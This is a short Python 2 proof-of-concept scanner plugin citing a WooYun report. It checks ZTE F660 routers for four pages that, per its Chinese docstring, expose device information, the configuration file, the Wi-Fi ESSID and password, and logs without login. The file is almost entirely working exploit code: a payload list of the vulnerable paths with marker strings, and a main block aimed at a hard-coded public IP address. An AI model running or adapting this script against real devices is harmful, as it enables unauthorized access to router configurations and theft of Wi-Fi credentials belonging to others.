#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  : ZTE-F660 4处未授权访问 
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066850

status_dev_info_t.gch            不登录情况下直接获取路由信息
manager_dev_config_t.gch         不登录情况下直接获取路由配置文件
wlan_security.gch                不登录情况下直接获取路由ESSID以及WIFI密码
manager_log_conf_t.gch           不登录情况下直接获取路由日志

"""

def assign(service, arg):
    if service == 'zte':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payloads = [
        ['status_dev_info_t.gch','Frm_CarrierName'],
        ['manager_dev_config_t.gch','ConfigUpload'],
        ['wlan_security.gch','PreSharedKey'],
        ['manager_log_conf_t.gch','Transfer_meaning']
        ]
    for p  in payloads:
        url = arg + p[0]
        code, head,res, errcode, _ = curl.curl2(url)
        if p[1] in res:
            security_hole(url)
        


if __name__ == '__main__':
    from dummy import *
    audit(assign('zte', 'http://220.173.136.106/')[1])